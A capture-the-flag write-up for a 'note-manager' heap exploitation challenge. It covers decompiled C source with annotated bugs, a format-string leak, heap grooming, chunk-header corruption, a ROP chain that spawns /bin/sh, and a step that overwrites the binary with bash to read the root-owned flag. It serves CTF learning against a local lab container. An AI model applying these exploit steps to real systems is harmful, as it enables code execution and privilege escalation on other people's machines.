# note-manager

[library.m0unt41n.ch/challenges/note-manager](https://library.m0unt41n.ch/challenges/note-manager) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

The program is serving a command-line operated vault, with options to add, remove and edit notes.
Additionally, notes can be loaded / saved to a file, for persistence across runs.

This was the first time I solved a "proper" heap exploitation challenge.
[This document](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-the-magicians-cape-1-byte-overflow)
was the most helpful resource in figuring it out.

# Decompiling the program

As usual, here is a full decompiled source, with some extra readability edits:

```c
#include <fcntl.h>
#include <malloc.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

typedef struct {
  char *name;
  long nameLen;
  char *text;
  long textLen;
} Note;
Note **notes;

int numnotes = 1, unviewedNotes = 0;
long notesCount = 2, usernameLength = 32;
char *username;

void fatalError(const char *message) {
    fputs(message, stderr);
    exit(1);
}

// Print note (two lines, with prompt).
// BUG: does not check the strings for NULLs or otherwise valid objects.
void printNote(const Note *note) {
    if ( !note ) fatalError("Note is Null");
    printf("\x1B[1;2m\n%s\n\x1B[m", note->name);
    puts(note->text);
}

// Simple getc with a prompt. No bugs.
char getchr(const char *prompt) {
    printf("%s%s", prompt, "\x1B[?25h");
    char result = getc(stdin);
    while ( getc(stdin) != '\n' ) ;
    return result;
}

// Simple getline() with a prompt. Trims \n to \0. No bugs.
char *getstr(const char *prompt) {
    printf("%s%s", prompt, "\x1B[?25h");
    char *lineptr = NULL;
    size_t n = 0;
    getline(&lineptr, &n, stdin);
    lineptr[strcspn(lineptr, "\n")] = 0;
    return lineptr;
}

// Custom gets(). Used only in editNote(). A bit weird:
// - Does not stop after len, just doesn't write to str
// - Does not write \0 at the end.
// - BUG (feature &#128578;) it allows zeros and stops only at \n
void gets(char *str, int len, FILE *f) {
    printf("\x1B[?25h");
    for ( int pos = 0; ; ++pos ) {
        char c = getc(f);
        if ( c == '\n' ) break;
        if ( pos < len ) str[pos] = c;
    }
}

// Two very similar functions for creating notes - either from call arguments or
// from stdin (with prompts). Similar logic:
// - If `notes` is full, grow it by x2
// - Create an empty Note struture
// - Fill 4 fields (either stdin or args)
// - Find first existing notes[] entry that is unused (NULL)
// - If none, use the one after (we now can because of above growth), increase numnotes
// - unViewedNotes++

// Add note using function args
int addNote(char *name, unsigned long nameLen, char *text, unsigned long textLen) {
    int i;
    if ( numnotes >= notesCount ) {
        notesCount *= 2;
        Note **resizedNotes = (Note**)realloc(notes, notesCount*sizeof(Note));
        if ( !resizedNotes ) fatalError("Failed allocating more memory");
        notes = resizedNotes;
    }
    Note *note = (Note*)malloc(sizeof(Note));
    note->name = name;
    note->nameLen = nameLen;
    note->text = text;
    note->textLen = textLen;
    for ( i = 0; i < numnotes && notes[i] != NULL; ++i ) ;
    if ( i == numnotes ) ++numnotes;
    notes[i] = note;
    return ++unviewedNotes;
}

// Create note from stdin
// BUG: expands the name/note strings to use entire malloc'd chunk. This is not a bug
//      per se, but combined with "+8" in "edit note" function, enables writing to
//      malloc chunk header. Crucial to the exploit.
int createNote() {
    int i;
    if ( numnotes >= notesCount ) {
        notesCount *= 2;
        Note **resizedNotes = (Note**)realloc(notes, notesCount*sizeof(Note));
        if ( !resizedNotes ) fatalError("Failed allocating more memory");
        notes = resizedNotes;
    }
    Note *note = (Note*)malloc(sizeof(Note));
    note->name = getstr("Name: ");
    note->nameLen = malloc_usable_size(note->name);
    note->text = getstr("Note: ");
    note->textLen = malloc_usable_size(note->text);
    for ( i = 0; i < numnotes && notes[i] != NULL; ++i ) ;
    if ( i == numnotes ) ++numnotes;
    notes[i] = note;
    return ++unviewedNotes;
}

// Appends new notes to the database, by loading them from 'notes' file.
// BUG: Assumes notes are added at the end (doesn't have to be the case, if some were
//      deleted earlier)
// BUG: Note names are malloc'd with one byte too few
unsigned int loadNotes() {
    int totalNotesRead = 0;
    FILE *stream = fdopen(open("notes", 0), "r");
    if ( !stream ) exit(1);
    puts("Loading Notes...");
    while ( 1 ) {
        size_t n = 0;
        char *line = NULL;
        int lineLen = getline(&line, &n, stream);
        if ( lineLen == -1 ) break;
        ++totalNotesRead;
        line[lineLen - 1] = 0;  // Trim \n
        char *colonPos = strchr(line, ':');
        if ( !colonPos ) fatalError("No ':' found in first line of notes file");

        // Alloc buffers for name/text
        int nameLen = colonPos - line;     // not good! needs one more!
        char *name = (char *)malloc(nameLen);
        int textLen = lineLen - nameLen;   // good, includes : which adds extra byte for \0
        char *text = (char *)malloc(textLen);

        // Copy name/text to buffers
        strncpy(name, line, nameLen);
        strncpy(text, &line[nameLen + 1], textLen);
        // Append note and print it
        addNote(name, nameLen, text, textLen);
        printNote(notes[numnotes - 1]);
    }
    fclose(stream);
    return totalNotesRead;
}

// Interactive menu
void showMenu(int firstTime) {
    char *name;
    int found;
    puts("\n===================================================\n");
    if ( firstTime )
        printf("\n\nWelcome\x1B[1;2m%s\x1B[mwould you like to ...\n\n", username);
    puts("[c]reate a new note");
    puts("[l]oads notes from note file");
    if ( unviewedNotes <= 0 )
        puts("[v]iew your notes");
    else
        printf("[v]iew your notes (%d unviewed)\n", unviewedNotes);
    puts("[e]dit a note");
    puts("[r]ename a note");
    puts("[s]aves notes to note file");
    puts("[d]elete a note");
    puts("[q]uit noteManager");
    char cmd = getchr("\x1B[?25h\x1B[1m\n > \x1B[m");
    puts("\n===================================================\n");
    switch ( cmd ) {

        case 'c':
            createNote();
            break;

        case 'd':
            puts("Deleting a Note:");
            printf("Name: ");
            name = getstr("Name: ");
            found = 0;
            for ( int i = 0; i < numnotes; ++i ) {
                if ( notes[i] && !strcmp(notes[i]->name, name) ) {
                    printf("Deleting %s...", notes[i]->name);
                    if ( i > 0 ) {
                        // Because notes[0] has text allocated on stack.
                        // Not a bug per se,  just weird.
                        free(notes[i]->name);
                        free(notes[i]->text);
                    }
                    free(notes[i]);
                    notes[i] = NULL;
                    found = 1;
                    break;
                }
            }
            free(name);
            if ( !found ) printf("%s was not found\n", name);
            break;

        case 'e':
            puts("Editing a Note:");
            printf("Name: ");
            name = getstr("Name: ");
            found = 0;
            for ( int i = 0; i < numnotes; ++i ) {
                if ( notes[i] && !strcmp(notes[i]->name, name) ) {
                    printf("New Note: ");
                    // BUG: Combined with malloc_usable_size() bug in CreateNote() above, this allows the
                    // "text" field to overwrite the header of the next malloc chunk!
                    gets(notes[i]->text, notes[i]->textLen + 8, stdin);
                    found = 1;
                    break;
                }
            }
            if ( !found ) printf("%s was not found\n", name);
            break;

        case 'l':
            if ( !loadNotes() ) fatalError("No notes Loaded");
            return;

        case 'q':
            while ( 1 ) {
                int confirmQuit = getchr("confirm? (y/N) ") | ' ';
                if ( confirmQuit == 'n' ) break;
                if ( confirmQuit == 'y' ) {
                    puts("Thank you for using NoteManager, see you later.");
                    exit(0);
                }
                puts("Please choose a valid option (y/N)");
            }
            break;

        case 'r':
            return;

        case 's':
            puts("Saving Notes...");
            FILE *stream = fopen("notes", "w");
            for ( int i = 0; i < numnotes; ++i ) {
                if ( notes[i] )
                    fprintf(stream, "%s:%s\n", notes[i]->name, notes[i]->text);
            }
            fclose(stream);
            break;

        // BUG (but actually, a feature): this is not in the menu.
        case 'u':
            puts("Updating your username:");
            if ( firstTime ) {
                printf("Your old username: ");
                printf(username);  // BUG: format string vulnerability, exploitable once.
            }
            printf("\nNew username length: ");
            scanf("%lu", &usernameLength);
            username = (char *)malloc(usernameLength);
            printf("%p", username);  // BUG: leaks heap pointer to new username.
            puts("\nNew Username: ");
            // Not sure why there are two instances (confirmed in disassembly). Anyway, it works.
            fgets(username, usernameLength, stdin);
            fgets(username, usernameLength, stdin);
            break;

        case 'v':
            puts("Your Notes:");
            for ( int i = 0; i < numnotes; ++i )
                if ( notes[i] )
                    printNote(notes[i]);
            unviewedNotes = 0;
            break;

        default:
            puts("Please choose a valid option (c/v/e/d/q)");
            break;
    }
}

// It is called twice
// - First, the program is started without arguments. It calculates length of the "flag" file and
//   then, drops privileges to $USERENV ("user") and re-executes itself with that length as an
//   argument
// - Then, when run with an argument, asks for username, creates the initial "secret note" and runs
//   user interaction, by calling showMenu() in a loop. Only first call enables the format string
//   vulnerability on the username.
int main(int argc, const char *argv[], const char **envp) {
    setvbuf(stdout, 0, _IONBF, 0);
    if ( argc != 1 ) {
        puts("\n--------------------------------------------");
        puts("|    Welcome to the Patriot NoteManager    |");
        puts("--------------------------------------------");
        username = getstr("\nPlease enter your username: ");

        // Create first secret note
        char name[12];  // BUG: this will stay on stack of main (that's why you can't delete note #0).
        strcpy(name, "Secret Note");
        char *text = (char *)malloc(234);  // 248 really
        sprintf(
            text,
            "We have managed to locate the secret key on the Patriots Servers. Sadly we only"
            " discovered that the length of the key is %s and that its hidden in this NoteManager."
            " We hope you will be able to find it soldier. The best of luck.   ",
            argv[1]);

        // Create the actual Note struct and fill it
        notes = (Note **)malloc(notesCount*sizeof(Note*));
        *notes = (Note *)malloc(32);
        (*notes)->name = &name[0];
        (*notes)->nameLen = 12;
        (*notes)->text = text;
        (*notes)->textLen = malloc_usable_size(text);  // BUG: same as above
        showMenu(1);
        while ( 1 ) showMenu(0);
    }
    // Seek in the 'flag' file, create flagLenString
    // It seems to be ignored later though
    FILE *stream = fopen("flag", "r");
    int initialPos = ftell(stream);
    fseek(stream, 0, SEEK_END);
    int flagLen = ftell(stream);
    fseek(stream, initialPos, SEEK_SET);
    char *path = (char *)*argv;
    char *flagLenString = (char *)malloc(4);
    sprintf(flagLenString, "%d", flagLen);
    // If running as root, drop privileges to $USERENV user.
            fatalError("getpwnam: Cannot find user\n");
        if ( !getuid() ) {
            if ( setgid(pw->pw_gid) )
                fatalError("setgid: Unable to drop group privileges\n");
            if ( setuid(pw->pw_uid) )
                fatalError("setuid: Unable to drop user privileges\n");
        }
    }
    // Re-execute yourself
    return execv(path, &path);
}
```

(Once compilet, it will segfault on start &#128578; but, that's not the point)

# Program analysis

## Critical bug #1: heap overflow

*   `createNote()` sets `nameLen` and `textLen` to `malloc_usable_size()` of respective
    chunks. This is not a bug on its own, but combined with below one, allows overwriting
    chunk header.

    ```c
    Note *note = (Note*)malloc(sizeof(Note));
    note->name = getstr("Name: ");
    note->nameLen = malloc_usable_size(note->name);
    note->text = getstr("Note: ");
    note->textLen = malloc_usable_size(note->text);
    ```

*   `showMenu()` / `Edit Note`. Calls the custom `gets()` with 8 extra characters, enabling overflow:

    ```c
    printf("Name: ");
    name = getstr("Name: ");
    for ( int i = 0; i < numnotes; ++i ) {
        if ( notes[i] && !strcmp(notes[i]->name, name) ) {
            printf("New Note: ");
            gets(notes[i]->text, notes[i]->textLen + 8, stdin);
            break;
        }
    }
    ```

## Critical bug #2: leak arbitrary addresses

`showMenu()` / `Update Username` (`u`):

*   Is not listed in the menu!
*   When called first time, it will `printf()` the initial username --> format string
    vulnerability.

    ```c
    if ( firstTime ) {
         printf("Your old username: ");
        printf(username);
    }
    ```
*   Leaks the heap address of newly allocated username string.

    ```c
    printf("\nNew username length: ");
        scanf("%lu", &usernameLength);
        username = (char *)malloc(usernameLength);
        printf("%p", username);
    }
    ```

## Other bugs

There are some other weird places, that were not needed in this solution:

*   `printNote()` does not check `name`/`text` for NULLs or other issues
*   Custom implementation of `gets()`, allowing `\0` characters, and reading past `len`
    (doesn't write extra characters though). It is used only in `Edit Note`.
*   `loadNotes()` always prints the last note after adding one, even if the addition might
    have reused one of the earlier slots. Note names are malloc'd with one byte too few
    (which is visible with some artifacts when loading the file multiple times).
*   `showMenu()` / `Delete Note`. Does not delete name/text for note #0 - because it's the
    buffer allocated on stack of `main()` in the setup. Still can delete the "note"!
*   `showMenu()` does not have stack canary
*   `showMenu()` / `Update Username` reads username *twice* (but couldn't confirm in runtime)


# Attack idea

1.   Extract needed runtime addresses (stack, heap, libc, text) with format string vulnerability
     and / or leak in `Update Username` function.
2.   Allocate a well-understood and repeatable set of chunks on the heap.
3.   Use `Edit Note` bug to trigger a heap overflow attack - corrupt the heap structures, so that
     we can allocate a segment that we control and which overlaps with an active `Note` structure.
4.   Use that to put stack return address in the `note` field of that structure.
5.   Use `Edit Note` on that node, to put a ROP chain on stack
6.   Return from `showMenu()` will execute the ROP chain

# 0. Some initial setup

Note: to ensure all the offsets are repeatable, the `notemanager` is always running in Docker image -
and this includes the `gdb` sessions below. You can install needed packages (gdb, pwndbg) directly
in the running container and/or add them to the `Dockerfile` and regenerate the image.

```python
from pwn import *
context.update(arch='x86_64', os='linux', encoding='ascii', log_level='warning')

# Some helpers
def NAME(n):
  return (("<NOTE_NAME_"+str(n)*4+">")*7)
def NOTE(n):
  return (("<note_note_"+str(n)*4+">")*7)
def IO():  # We'll need this twice
  return remote('127.0.0.1', 5000, ssl=False)
PROMPT=" > \x1B[m\x1B[?25h"
io = IO()
```

Let's also tweak the `Dockerfile`, installing a bunch of useful tools:

```Dockerfile
FROM ubuntu:18.04@sha256:dca176c9663a7ba4c1f0e710986f5a25e672842963d95b960191e2d9f7185ebe

RUN apt update && apt install -y socat

### ADDED FOR DEBUGGING
RUN apt install -y python3-pip python3-dev git libssl-dev libffi-dev build-essential gdb git wget vim
RUN python3 -m pip install --upgrade pip
RUN python3 -m pip install --upgrade pwntools
RUN git clone --branch 2023.07.17 https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

ARG USER=user

ENV USERENV=$USER
RUN adduser --disabled-password $USER

WORKDIR /home/${USER}
COPY notemanager ./
COPY flag ./

### ADDED FOR DEBUGGING
RUN echo "source /pwndbg/gdbinit.py" >.gdbinit
RUN echo "set show-tips off" >>.gdbinit
RUN echo "set max-visualize-chunk-size 192" >>.gdbinit
RUN echo "alias gdb='gdb -q'" >.bashrc
RUN echo "export LC_CTYPE=C.UTF-8" >>.bashrc
RUN chown user:user .gdbinit .bashrc

RUN chmod +x ./notemanager
RUN chown root flag
RUN chmod 600 flag

ENTRYPOINT ["socat", "TCP-LISTEN:5000,reuseaddr,fork", "EXEC:\"./notemanager\""]
```

# 1. Leak the addresses

We have full control over format string, so, we can pretty much leak arbitrary thing on stack. Let's see what we actually have:

```
$ for N in `seq 1 50`; do echo -n "$N:0x%$N\$llx "; done
1:0x%1$llx 2:0x%2$llx 3:0x%3$llx 4:0x%4$llx 5:0x%5$llx 6:0x%6$llx 7:0x%7$llx 8:0x%8$llx 9:0x%9$llx 10:0x%10$llx 11:0x%11$llx 12:0x%12$llx 13:0x%13$llx 14:0x%14$llx 15:0x%15$llx 16:0x%16$llx 17:0x%17$llx 18:0x%18$llx 19:0x%19$llx 20:0x%20$llx 21:0x%21$llx 22:0x%22$llx 23:0x%23$llx 24:0x%24$llx 25:0x%25$llx 26:0x%26$llx 27:0x%27$llx 28:0x%28$llx 29:0x%29$llx 30:0x%30$llx 31:0x%31$llx 32:0x%32$llx 33:0x%33$llx 34:0x%34$llx 35:0x%35$llx 36:0x%36$llx 37:0x%37$llx 38:0x%38$llx 39:0x%39$llx 40:0x%40$llx 41:0x%41$llx 42:0x%42$llx 43:0x%43$llx 44:0x%44$llx 45:0x%45$llx 46:0x%46$llx 47:0x%47$llx 48:0x%48$llx 49:0x%49$llx 50:0x%50$llx
```

Trigger the leak:

*    Connect to the server
*    Use above string as "username"
*    Type `u` to change username and look at the output

We get:

```
1:0x7ffdd7ce7050 2:0x7f39597ed8c0 3:0x0 4:0x13 5:0x6 6:0x7ffdd7ce98a0 7:0x100000000 8:0x75000000 9:0x7f39594970ac 10:0x27a 11:0xdb6ec0ab845f2100 12:0x7ffdd7ce97c0 13:0x555c21445680 14:0x7ffdd7ce97c0 15:0x555be4201fcc 16:0x7ffdd7ce98a8 17:0x200000000 18:0x1 19:0x80000000 20:0x555c21445580 21:0x7f3959802660 22:0x7ffdd7ce97d8 23:0x2 24:0x1 25:0x555be420203d 26:0x7f3959810b40 27:0x7263655300000000 28:0x65746f4e207465 29:0xdb6ec0ab845f2100 30:0x7ffdd7ce98a0 31:0x0 32:0x555be4201ff0 33:0x7f3959421c87 34:0x2000000000 35:0x7ffdd7ce98a8 36:0x200000000 37:0x555be4201cf3 38:0x0 39:0xa75fc4b44fdb81ac 40:0x555be4200f30 41:0x7ffdd7ce98a0 42:0x0 43:0x0 44:0xf213a3695f9b81ac 45:0xf39abe70484581ac 46:0x7ffd00000000 47:0x0 48:0x0 49:0x7f39598108d3 50:0x7f39597e7638
```

## Return address on stack

Let's go back to the main menu and look at the running binary with `gdb`.

```
pwndbg> bt
#0  0x00007f3959510031 in __GI___libc_read
#1  0x00007f395948d0f8 in _IO_new_file_underflow
#2  0x00007f395948e3a2 in __GI__IO_default_uflow
#3  0x0000555be42010ed in getchr ()
#4  0x0000555be4201753 in showMenu ()
#5  0x0000555be4201fcc in main ()
#6  0x00007f3959421c87 in __libc_start_main
#7  0x0000555be4200f5a in _start ()

pwndbg> stack 100
1a:00d0│     0x7ffdd7ce9738 —▸ 0x555be4201fcc (main+729) ◂— mov dword ptr [rbp - 0x70], 0
```

And we have `%6$llx` yielding `0x7ffdd7ce98a0`. Therefore,
`%6$llx + 0x7ffdd7ce9738 - 0x7ffdd7ce98a0` should get us the return address on stack.

## libC address

```
pwndbg> print (void*)__libc_start_main
$5 = (void *) 0x7f3959421ba0 <__libc_start_main>
```

```
$ objdump -T libc-2.27.so  | grep __libc_start_main
0000000000021ba0 g    DF .text  00000000000001be  GLIBC_2.2.5 __libc_start_main
```

And closest we have to `0x7f3959421ba0` is `%33llx` yielding `0x7f3959421c87`. Therefore:

*   `__libc_start_main` = `%33llx` + `0x7f3959421ba0 - 0x7f3959421c87`
*   glibc base address = `%33llx` + `0x7f3959421ba0 - 0x7f3959421c87 - 0x21ba0`

## Trigger the leaks

```python
io.sendlineafter("Please enter your username: ", "0x%6$llx 0x%33$llx")

io.sendlineafter(PROMPT, "u")
io.recvuntilS("Your old username: ")

(retaddr, libcPtr) = io.recvlineS().strip().split(" ")
retaddr = int(retaddr, 16) + 0x7ffdd7ce9738 - 0x7ffdd7ce98a0
libcPtr = int(libcPtr, 16) + 0x7f3959421ba0 - 0x7f3959421c87 - 0x21ba0

username = "USERNAME"
io.sendlineafter("New username length: ", str(len(username)))
usernamePtr = int(io.recvlineS().strip(), 16)
io.sendlineafter("New Username: ", username)
```

Note that we also get `usernamePtr`, which we will need it in a moment, to calculate various
offsets on the heap.

# 2. Prepare the heap

To effectively use the overflow bug, we need to have a predictable, repeatable structure on the heap.
Even more so, as:

*   We can freely edit only *every third* malloc block (note text). 
*   Other allocations will get in the way (mainly: resizing the `notes` array, as we add more)

With a bit of trial and error, seems that creating six notes yields three of them in
consecutive chunks of memory:

```python
for n in range(1,7):
  io.sendlineafter(PROMPT, "c")
  io.sendlineafter("Name: ", NAME(n))
  io.sendlineafter("Note: ", NOTE(n))
```

This results in following heap layout:

```
pwndbg> vis_heap_chunks 99
(...)
0x561387c25430  0x0000000000000000  0x0000000000000021  ........!.......
0x561387c25440  0x004d414e52455355  0x0000000000000000  USERNAM.........    <-- usernamePtr
0x561387c25450  0x0000000000000000  0x0000000000000031  ........1.......
0x561387c25460  0x0000561387c25490  0x0000000000000078  .T...V..x.......    <-- notes[1]
0x561387c25470  0x0000561387c25510  0x0000000000000078  .U...V..x.......
0x561387c25480  0x0000000000000000  0x0000000000000081  ................
0x561387c25490  0x49545f45544f4e3c  0x3e3131315f454c54  <NOTE_TITLE_111>    <-- notes[1]->name
0x561387c254a0  0x49545f45544f4e3c  0x3e3131315f454c54  <NOTE_TITLE_111>
0x561387c254b0  0x49545f45544f4e3c  0x3e3131315f454c54  <NOTE_TITLE_111>
(...)
0x561387c25870  0x0000000000000000  0x0000000000000111  ................
0x561387c25880  0x0000561387c25410  0x0000561387c25460  .T...V..`T...V..    <-- notes
0x561387c25890  0x0000561387c25620  0x0000561387c25750   V...V..PW...V..
0x561387c258a0  0x0000561387c25990  0x0000561387c25ac0  .Y...V...Z...V..
0x561387c258b0  0x0000561387c25bf0  0x0000000000000000  .[...V..........
0x561387c258c0  0x0000000000000000  0x0000000000000000  ................
0x561387c258d0  0x0000000000000000  0x0000000000000000  ................
0x561387c258e0  0x0000000000000000  0x0000000000000000  ................
0x561387c258f0  0x0000000000000000  0x0000000000000000  ................
0x561387c25900  0x0000000000000000  0x0000000000000000  ................
0x561387c25910  0x0000000000000000  0x0000000000000000  ................
0x561387c25920  0x0000000000000000  0x0000000000000000  ................
0x561387c25930  0x0000000000000000  0x0000000000000000  ................
0x561387c25940  0x0000000000000000  0x0000000000000000  ................
0x561387c25950  0x0000000000000000  0x0000000000000000  ................
0x561387c25960  0x0000000000000000  0x0000000000000000  ................
0x561387c25970  0x0000000000000000  0x0000000000000000  ................
0x561387c25980  0x0000000000000000  0x0000000000000031  ........1.......
0x561387c25990  0x0000561387c259c0  0x0000000000000078  .Y...V..x.......    <-- notes[4]
0x561387c259a0  0x0000561387c25a40  0x0000000000000078  @Z...V..x.......
0x561387c259b0  0x0000000000000000  0x0000000000000081  ................
0x561387c259c0  0x49545f45544f4e3c  0x3e3434345f454c54  <NOTE_TITLE_444>    <-- notes [4]->name
0x561387c259d0  0x49545f45544f4e3c  0x3e3434345f454c54  <NOTE_TITLE_444>
0x561387c259e0  0x49545f45544f4e3c  0x3e3434345f454c54  <NOTE_TITLE_444>
0x561387c259f0  0x49545f45544f4e3c  0x3e3434345f454c54  <NOTE_TITLE_444>
0x561387c25a00  0x49545f45544f4e3c  0x3e3434345f454c54  <NOTE_TITLE_444>
0x561387c25a10  0x49545f45544f4e3c  0x3e3434345f454c54  <NOTE_TITLE_444>
0x561387c25a20  0x49545f45544f4e3c  0x3e3434345f454c54  <NOTE_TITLE_444>
0x561387c25a30  0x0000000000000000  0x0000000000000081  ................
0x561387c25a40  0x65745f65746f6e3c  0x3e343434345f7478  <note_text_4444>    <-- notes [4]->note
0x561387c25a50  0x65745f65746f6e3c  0x3e343434345f7478  <note_text_4444>
0x561387c25a60  0x65745f65746f6e3c  0x3e343434345f7478  <note_text_4444>
0x561387c25a70  0x65745f65746f6e3c  0x3e343434345f7478  <note_text_4444>
0x561387c25a80  0x65745f65746f6e3c  0x3e343434345f7478  <note_text_4444>
0x561387c25a90  0x65745f65746f6e3c  0x3e343434345f7478  <note_text_4444>
0x561387c25aa0  0x65745f65746f6e3c  0x3e343434345f7478  <note_text_4444>
0x561387c25ab0  0x0000000000000000  0x0000000000000031  ........1.......
0x561387c25ac0  0x0000561387c25af0  0x0000000000000078  .Z...V..x.......    <-- notes[5]
0x561387c25ad0  0x0000561387c25b70  0x0000000000000078  p[...V..x.......
0x561387c25ae0  0x0000000000000000  0x0000000000000081  ................
0x561387c25af0  0x49545f45544f4e3c  0x3e3535355f454c54  <NOTE_TITLE_555>    <-- notes [5]->name
0x561387c25b00  0x49545f45544f4e3c  0x3e3535355f454c54  <NOTE_TITLE_555>
0x561387c25b10  0x49545f45544f4e3c  0x3e3535355f454c54  <NOTE_TITLE_555>
0x561387c25b20  0x49545f45544f4e3c  0x3e3535355f454c54  <NOTE_TITLE_555>
0x561387c25b30  0x49545f45544f4e3c  0x3e3535355f454c54  <NOTE_TITLE_555>
0x561387c25b40  0x49545f45544f4e3c  0x3e3535355f454c54  <NOTE_TITLE_555>
0x561387c25b50  0x49545f45544f4e3c  0x3e3535355f454c54  <NOTE_TITLE_555>
0x561387c25b60  0x0000000000000000  0x0000000000000081  ................
0x561387c25b70  0x65745f65746f6e3c  0x3e353535355f7478  <note_text_5555>    <-- notes [5]->note
0x561387c25b80  0x65745f65746f6e3c  0x3e353535355f7478  <note_text_5555>
0x561387c25b90  0x65745f65746f6e3c  0x3e353535355f7478  <note_text_5555>
0x561387c25ba0  0x65745f65746f6e3c  0x3e353535355f7478  <note_text_5555>
0x561387c25bb0  0x65745f65746f6e3c  0x3e353535355f7478  <note_text_5555>
0x561387c25bc0  0x65745f65746f6e3c  0x3e353535355f7478  <note_text_5555>
0x561387c25bd0  0x65745f65746f6e3c  0x3e353535355f7478  <note_text_5555>
0x561387c25be0  0x0000000000000000  0x0000000000000031  ........1.......
0x561387c25bf0  0x0000561387c25c20  0x0000000000000078   \...V..x.......    <-- notes[6]
0x561387c25c00  0x0000561387c25ca0  0x0000000000000078  .\...V..x.......
0x561387c25c10  0x0000000000000000  0x0000000000000081  ................
0x561387c25c20  0x49545f45544f4e3c  0x3e3636365f454c54  <NOTE_TITLE_666>    <-- notes [6]->name
0x561387c25c30  0x49545f45544f4e3c  0x3e3636365f454c54  <NOTE_TITLE_666>
0x561387c25c40  0x49545f45544f4e3c  0x3e3636365f454c54  <NOTE_TITLE_666>
0x561387c25c50  0x49545f45544f4e3c  0x3e3636365f454c54  <NOTE_TITLE_666>
0x561387c25c60  0x49545f45544f4e3c  0x3e3636365f454c54  <NOTE_TITLE_666>
0x561387c25c70  0x49545f45544f4e3c  0x3e3636365f454c54  <NOTE_TITLE_666>
0x561387c25c80  0x49545f45544f4e3c  0x3e3636365f454c54  <NOTE_TITLE_666>
0x561387c25c90  0x0000000000000000  0x0000000000000081  ................
0x561387c25ca0  0x65745f65746f6e3c  0x3e363636365f7478  <note_text_6666>    <-- notes [6]->note
0x561387c25cb0  0x65745f65746f6e3c  0x3e363636365f7478  <note_text_6666>
0x561387c25cc0  0x65745f65746f6e3c  0x3e363636365f7478  <note_text_6666>
0x561387c25cd0  0x65745f65746f6e3c  0x3e363636365f7478  <note_text_6666>
0x561387c25ce0  0x65745f65746f6e3c  0x3e363636365f7478  <note_text_6666>
0x561387c25cf0  0x65745f65746f6e3c  0x3e363636365f7478  <note_text_6666>
0x561387c25d00  0x65745f65746f6e3c  0x3e363636365f7478  <note_text_6666>
0x561387c25d10  0x0000000000000000  0x000000000001f2f1  ................   <-- Top chunk
```

## 3. Create a "free" chunk overlapping with notes[6]

Corrupt the `notes[5]` chunk - make it look like `0x160` bytes - extending up to and including
`notes[5] chunk.

```python
io.sendlineafter(PROMPT, "e")
io.sendlineafter("Name: Name: ", NAME(4))
io.sendlineafter("New Note: ", NOTE(4).encode('ascii')+b"ZZZZZZZZ"+p64(0x161))
```

Delete note #5. This will delete both strings first (putting them in `0x80` Tcache bin) and then,
delete the `notes[5]` chunk, which at this point is `0x160` bytes long and, as such will be put
in the fastbin cache.

```python
io.sendlineafter(PROMPT, "d")
io.sendlineafter("Name: Name: ", NAME(5))
```

At this point, next allocation of `0x150` bytes will reuse this chunk - all that while it overlaps
with `notes[6]`, which is still in use we can edit the string that `notes[6]->note` is pointing to.

## 4. Make notes[6]->note point to stack return address.

We will use `Change User` for that. What payload do we put there?

```python
# Overwrite area between notes[5] struct and end of notes[5]->text (excl. final zero qword)
payload = (0x561387c25be0 - 0x561387c25ac0)*b"A"
# Append the extra zero qword and the chunk header for notes[6]
payload += p64(0) + p64(0x31)
# Append desired notes[6] struct content
note6NamePtr = usernamePtr + 0x561387c25bf0 - 0x561387c25440+0x30
payload += p64(note6NamePtr) + p64(0x78)  # Keep same name length
payload += p64(retaddr) + p64(0x80) 
# Now, "rename" user to the payload. That will overwrite notes[6].
io.sendlineafter(PROMPT, "u")
io.recvuntilS("New username length: ")
io.sendline(str(len(payload)))
io.sendlineafter("New Username: ", payload)
```

(for any of the hex addresses used above, refer to heap dump)

## 5. Edit notes[6] - put the ROP chain on stack and get the shell

Now that `notes[6]` is ready, with stack address in the `note` field, all that's left is
just to 'edit' that note to contain the ROP chain:

```python
# ROPgadget --binary libc-2.27.so  | grep ': pop rdi ; ret$'
payload  = p64(libcPtr + 0x0002164f)
# ROPgadget --binary libc-2.27.so  --string '/bin/sh'
payload += p64(libcPtr + 0x001b3d88)
# ROPgadget --binary libc-2.27.so  | grep ': pop rsi ; ret$'
payload += p64(libcPtr + 0x00023a6a)
payload += p64(0)
# ROPgadget --binary libc-2.27.so  | grep ': pop rdx ; ret$'
payload += p64(libcPtr + 0x00001b96)
payload += p64(0)
# ROPgadget --binary libc-2.27.so  | grep ': pop rax ; ret$'
payload += p64(libcPtr + 0x0001b500)
payload += p64(59)  # execve
# ROPgadget --binary libc-2.27.so  | grep ': syscall$'
payload += p64(libcPtr + 0x00002743)

io.sendlineafter(PROMPT, "e")
io.sendlineafter("Name: Name: ", NAME(6))
io.sendlineafter("New Note: ", payload)
```

At this point, return from `showMenu()` will execute the ROP chain and get us a shell

```python
io.interactive()
```

# Get a root shell from user shell and get the flag

There is one problem though:

```
$ id -a
uid=1000(user) gid=1000(user) groups=1000(user),0(root)
$ ls -la
drwxr-xr-x. 1 user user  4096 Sep  6 22:40 .
drwxr-xr-x. 1 root root  4096 Sep  4 17:23 ..
-rw-------. 1 root root    58 Sep  1 17:27 flag
-rwxr-xr-x. 1 root root 18480 Aug  7 20:22 notemanager
```

We can't get the flag, because `notemanager` is running as `user` (remember the
privilege-dropping and re-execution logic). But we have write permissions to the
directory. The easiest way is to simply overwrite `notemanager` with a copy of
`/bin/bash` and reconnect again - next request will be handled by bash.

Let's do it in style though &#128578; Replace `io.interactive()` with:

```python
io.sendline("rm notemanager ; cp /bin/bash notemanager ; exit")
io.close()
sleep(0.5)
io = IO()
sleep(1)  # Might need a bit more for remote
io.sendline("cat flag")
print(io.recvlineS(), end="")
io.close()
```

---

## `shc2023{d1D_Y0u_F0Rc3_Y0uR_w4Y_1n?_2d294189d49f9aad}`




<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
